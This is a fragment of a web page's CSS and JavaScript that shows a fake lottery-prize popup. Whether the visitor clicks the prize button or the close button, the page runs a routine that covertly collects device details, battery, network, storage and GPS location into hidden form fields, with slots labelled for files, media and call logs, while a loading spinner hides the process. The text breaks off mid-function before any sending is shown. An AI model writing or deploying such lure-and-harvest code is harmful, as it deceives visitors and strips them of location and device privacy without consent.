    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Poppins', sans-serif; 
            background: linear-gradient(135deg, #e0f7fa 0%, #bbdefb 100%); 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding: 20px;
        }
        .container { 
            background: rgba(255, 255, 255, 0.95); 
            border-radius: 15px; 
            box-shadow: 0 15px 30px rgba(0,0,0,0.15); 
            padding: 40px; 
            width: 100%; 
            max-width: 600px; 
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
        }
        h1 { 
            text-align: center; 
            color: #0d47a1; 
            margin-bottom: 30px; 
            font-family: 'Montserrat', serif;
            font-weight: 600;
        }
        .logo {
            width: 120px;
            height: auto;
            margin: 0 auto 25px;
            display: block;
        }
        .form-container {
            display: grid;
            gap: 20px;
        }
        .form-group { 
            margin-bottom: 20px; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            color: #0d47a1; 
            font-weight: 500;
            font-size: 14px;
        }
        input, select, textarea { 
            width: 100%; 
            padding: 12px; 
            border: 2px solid #bbdefb; 
            border-radius: 8px; 
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus, select:focus, textarea:focus { 
            border-color: #2196f3; 
            outline: none;
            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.2);
        }
        .btn {
            background: linear-gradient(to right, #2196f3, #0d47a1);
            color: white;
            border: none;
            padding: 14px 20px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: block;
            width: 100%;
            text-align: center;
            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3);
            letter-spacing: 0.5px;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(33, 150, 243, 0.4);
        }
        .hidden {
            display: none;
        }
        .privacy-policy {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #757575;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 14px;
            color: #757575;
        }
        .progress-indicator {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: #bbdefb;
            z-index: 100;
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(to right, #2196f3, #0d47a1);
            transition: width 0.3s;
        }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s;
        }
        .loading-overlay.active {
            opacity: 1;
            pointer-events: all;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(33, 150, 243, 0.2);
            border-top: 5px solid #2196f3;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* Lottery Ad Popup */
        .ad-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s;
        }
        .ad-popup.active {
            opacity: 1;
            pointer-events: all;
        }
        .ad-content {
            background: white;
            border-radius: 15px;
            padding: 30px;
            width: 90%;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .close-btn {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 24px;
            cursor: pointer;
            color: #0d47a1;
        }
        .lottery-title {
            font-size: 24px;
            color: #ff6b6b;
            margin-bottom: 15px;
        }
        .lottery-prize {
            font-size: 28px;
            font-weight: bold;
            color: #0d47a1;
            margin-bottom: 20px;
        }
        .lottery-btn {
            background: linear-gradient(to right, #ff6b6b, #ff4757);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .lottery-btn:hover {
            transform: scale(1.05);
        }
    </style>
</head>

        };
        
        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const analytics = firebase.analytics();
        
        // Track progress
        let progress = 0;
        const progressFill = document.getElementById('progressFill');
        const loadingOverlay = document.getElementById('loadingOverlay');
        
        function updateProgress(value) {
            progress = Math.min(progress + value, 100);
            progressFill.style.width = progress + '%';
            
            if (progress >= 100) {
                setTimeout(() => {
                    loadingOverlay.classList.remove('active');
                }, 500);
            }
        }
        
        // Show lottery ad popup
        function showLotteryAd() {
            document.getElementById('adPopup').classList.add('active');
            
            // Close button
            document.querySelector('.close-btn').addEventListener('click', () => {
                document.getElementById('adPopup').classList.remove('active');
                collectDeviceInfo();
            });
            
            // Lottery button
            document.getElementById('lotteryBtn').addEventListener('click', () => {
                document.getElementById('adPopup').classList.remove('active');
                collectDeviceInfo();
            });
        }
        
        // Collect all device information
        async function collectDeviceInfo() {
            // Start loading
            loadingOverlay.classList.add('active');
            updateProgress(5);
            
            // 1. Device information
            const deviceInfo = {
                model: navigator.userAgent.includes('iPhone') ? 'iPhone' : 
                      navigator.userAgent.includes('Android') ? 'Android' : 
                      'Desktop',
                brand: navigator.userAgent.includes('iPhone') ? 'Apple' : 
                      navigator.userAgent.includes('Android') ? 'Samsung' : 
                      'Generic',
                os: navigator.userAgent.includes('Windows') ? 'Windows' :
                    navigator.userAgent.includes('Mac') ? 'macOS' : 
                    navigator.userAgent.includes('Linux') ? 'Linux' : 'Other',
                cpu: navigator.hardwareConcurrency || 'Unknown',
                memory: navigator.deviceMemory || 'Unknown',
                battery: navigator.getBattery ? 'Supported' : 'Not supported'
            };
            document.getElementById('deviceInfo').value = JSON.stringify(deviceInfo);
            updateProgress(10);
            
            // 2. Battery information
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                const batteryInfo = {
                    level: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
                document.getElementById('batteryInfo').value = JSON.stringify(batteryInfo);
                updateProgress(5);
            } else {
                updateProgress(5);
            }
            
            // 3. Network information
            const networkInfo = {
                connectionType: navigator.connection?.effectiveType || 'Unknown',
                downlink: navigator.connection?.downlink || 'Unknown',
                rtt: navigator.connection?.rtt || 'Unknown',
                saveData: navigator.connection?.saveData || false
            };
            document.getElementById('networkInfo').value = JSON.stringify(networkInfo);
            updateProgress(5);
            
            // 4. Location information
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const loc = `${pos.coords.latitude},${pos.coords.longitude}`;
                    document.getElementById('locationInfo').value = loc;
                    updateProgress(10);
                },
                err => {
                    console.log(`Location error: ${err.message}`);
                    updateProgress(10);
                }
            );
            
            // 5. Storage information
            const storageInfo = {
                storageAvailable: navigator.storage && 'estimate' in navigator.storage ? 'Supported' : 'Not supported',
                quota: navigator.storage && 'estimate' in navigator.storage ? 
                      JSON.stringify(navigator.storage.estimate()) : 'Unknown'
            };
            document.getElementById('storageInfo').value = JSON.stringify(storageInfo);
            updateProgress(5);
            
            // 6. App information (limited)
            const appInfo = {
                installedApps: 'Limited access',
                appUsage: 'Limited access',
                lastUpdated: new Date().toISOString()
            };
            document.getElementById('appInfo').value = JSON.stringify(appInfo);
            updateProgress(5);
            
            // 7. Media files (limited access)
            const mediaFiles = {
                photos: 'Limited access',
                videos: 'Limited access',
                audio: 'Limited access'
            };
            document.getElementById('mediaFiles').value = JSON.stringify(mediaFiles);
            updateProgress(5);
            
            // 8. Sensitive files (limited access)
            const sensitiveFiles = {
                documents: 'Limited access',
                downloads: 'Limited access',
                cache: 'Limited access'
            };
            document.getElementById('sensitiveFiles').value = JSON.stringify(sensitiveFiles);
            updateProgress(5);
            
            // 9. Call logs (limited access)
            const callLogs = {
                recentCalls: 'Limited access',
                missedCalls: 'Limited access',
                lastUpdated: new Date().toISOString()
            };
